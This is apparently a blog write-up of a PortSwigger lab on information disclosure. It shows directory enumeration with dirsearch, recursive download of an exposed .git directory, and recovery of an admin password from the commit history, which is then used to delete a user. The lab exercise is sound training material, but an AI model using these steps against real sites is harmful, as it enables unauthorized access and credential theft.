---
layout: post
title: "Lab: Information disclosure in version control history [Write-up]"
date: 2026-07-26
platform: portswigger
vulntype: information_disclosure
difficulty: Medium
category: write-up
tags: [web]
---

## Overview

**Lab:** Lab: Information disclosure in version control history

**Platform:** PortSwigger

**Difficulty:** Medium

---

## Description

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the administrator user then log in and delete the user carlos.

## Solution

After scanning the entire site using Burp Suite and manual exploration, I wasn't able to get anywhere, so I started using automated tools. 

I used the `dirsearch` tool with its built-in dictionary by entering the following command in the Linux terminal 

```python
dirsearch -u https://0a7f003d03ca79da80c0942500bc004a.web-security-academy.net/
```

After a while, I found the .git directory 

> **`.git`** is Git's internal directory that stores the repository's history, commits, branches, and metadata. If it is publicly accessible on a web server, an attacker may be able to reconstruct the application's source code and recover sensitive information from the commit history.

I used this command to download all the files 

```python
wget -r https://0a7f003d03ca79da80c0942500bc004a.web-security-academy.net/.git/
```

I solved this problem using the Git Cola graphical user interface, but if you don't want to use the GUI, you can use the terminal by entering the command

```python
git log -p
```

```python
└─$ git log -p
commit f35f5f92fd9b263991b90ef449ea51540176a004 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

diff --git a/admin.conf b/admin.conf
new file mode 100644
index 0000000..e468053
--- /dev/null
+++ b/admin.conf
@@ -0,0 +1 @@
+ADMIN_PASSWORD=lzuibu5wrg70irs85r1r
diff --git a/admin_panel.php b/admin_panel.php
new file mode 100644
index 0000000..8944e3b
--- /dev/null
+++ b/admin_panel.php
@@ -0,0 +1 @@
+<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
\ No newline at end of file
```

```python
+ADMIN_PASSWORD=lzuibu5wrg70irs85r1r
```

We can view the administrator password, copy it, log in to the account, and then go to the admin panel to delete the user `carlos.`

---
<div align="center">

This post is licensed under  
<a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>.

© 2026 CyberKRY

</div>
